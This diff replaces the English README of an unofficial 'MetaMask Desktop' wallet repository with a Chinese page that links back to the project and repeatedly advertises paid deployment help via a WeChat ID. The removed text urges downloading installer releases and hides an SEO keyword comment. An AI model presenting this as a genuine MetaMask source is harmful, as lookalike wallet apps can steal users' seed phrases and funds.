@@ -1,3 +1,42 @@
-> **原项目:** [MetaMask-AI/metamask-desktop](https://github.com/MetaMask-AI/metamask-desktop) | **中文版:** [README.zh-CN.md](README.zh-CN.md) | **代部署联系微信: uaycar**
+<div align="center">
 
-# MetaMask Desktop Wallet for Windows, macOS and Linux  ## Overview  MetaMask Desktop is a cross-platform desktop application for managing a cryptocurrency wallet, interacting with Web3 applications, and accessing decentralized ecosystems such as DeFi and NFTs.  The project provides a desktop-first alternative to the browser extension experience, offering improved stability, performance, and system-level integration for Windows, macOS, and Linux users.  This project is not affiliated with or officially endorsed by :contentReference[oaicite:0]{index=0} or ConsenSys.  ---  ## Features  - Secure management of Ethereum wallets and ERC-20 / ERC-721 assets - Built-in Web3 provider for connecting to decentralized applications (DApps) - Support for multiple accounts and wallet switching - Import and export of seed phrases (mnemonic recovery) - Custom RPC network configuration (Ethereum, Polygon, BSC, and others) - Transaction history tracking - Local encrypted key storage - Optional hardware wallet support (Ledger, Trezor, depending on configuration)  ---  ## Key Advantages of Desktop Version  - No browser extension required - Isolated runtime environment for improved security - Faster startup compared to browser-based wallets - Stable performance across different operating systems - Better multi-network and multi-account workflow - Suitable for both everyday users and advanced Web3 developers  ---  ## Screenshots  <table> <tr> <td> <img width="440" height="676" alt="metamask-windows" src="https://github.com/user-attachments/assets/3bebba8d-0573-477f-b371-f819172a872f" /> </td> <td> <img width="421" height="614" alt="metamask-linux" src="https://github.com/user-attachments/assets/7b34a5dc-08d8-471a-9fb2-c2cf1abd4bd4" /> </td> <td> <img width="466" height="689" alt="metamask-macos" src="https://github.com/user-attachments/assets/ad88eab3-6e04-4ced-80f9-960f7ceaf421" /> </td> </tr> </table>  ---  ## Installation  ### Windows  Download the latest .exe installer from the [releases](../../releases/tag/v1.6.0) page Run the installer and follow setup instructions  ### macOS  Download the latest .dmg package from the [releases](../../releases/tag/v1.6.0) page Open and drag the application into Applications folder  ### Linux  Download the .AppImage file from the [releases](../../releases/tag/v1.6.0) page Run the following commands: ```bash chmod +x MetaMask-Desktop-1.6.0.AppImage ./MetaMask-Desktop-1.6.0.AppImage ```  ## Project Architecture - Electron / Tauri-based desktop runtime - Web3.js / Ethers.js integration layer - Secure local encrypted storage system - Modular RPC provider architecture - Isolated wallet state management  ## Security Model  - Private keys are stored only on the local device - Seed phrases are never transmitted over the network - All sensitive data is encrypted at rest - No centralized backend dependency for wallet operations   ## License  This project is licensed under the [MIT License](/LICENSE)   <!-- ## Keywords  MetaMask desktop wallet, MetaMask PC app, MetaMask Windows wallet, MetaMask macOS crypto wallet, MetaMask Linux application, Web3 desktop wallet, Ethereum wallet desktop app, DeFi wallet PC, crypto wallet application for desktop, ERC-20 wallet manager, blockchain wallet desktop client  -->
+# metamask-desktop 中文翻译版
+
+**[中文版] MetaMask 桌面版 — 浏览以太坊 DApp 的独立桌面客户端**
+
+[![原项目](https://img.shields.io/badge/原项目-MetaMask-AI--metamask-desktop-blue?style=flat-square&logo=github)](https://github.com/MetaMask-AI/metamask-desktop)
+[![中文版](https://img.shields.io/badge/中文版-README.zh--CN.md-orange?style=flat-square)](README.zh-CN.md)
+[![微信联系](https://img.shields.io/badge/微信-uaycar-brightgreen?style=flat-square&logo=wechat)](#)
+
+</div>
+
+---
+
+这是 [MetaMask-AI/metamask-desktop](https://github.com/MetaMask-AI/metamask-desktop) 的中文翻译版本
+
+完整源代码请访问原项目：https://github.com/MetaMask-AI/metamask-desktop
+
+**代部署/定制服务请联系微信：uaycar**
+
+---
+
+## 项目简介
+
+MetaMask 桌面版是一款独立的桌面应用程序，让用户可以直接在桌面上浏览和交互以太坊区块链去中心化应用（DApp）。
+
+## 文件说明
+
+| 文件 | 说明 |
+|:-----|:-----|
+| README.md | 本文件（中文简介） |
+| README.zh-CN.md | [详细中文文档](README.zh-CN.md) |
+
+## 快速开始
+
+完整源代码请访问原项目：https://github.com/MetaMask-AI/metamask-desktop
+
+---
+
+**代部署 / 定制服务 / 技术咨询 请添加微信：uaycar**
+
+**觉得有用？请给原项目点个 Star！**
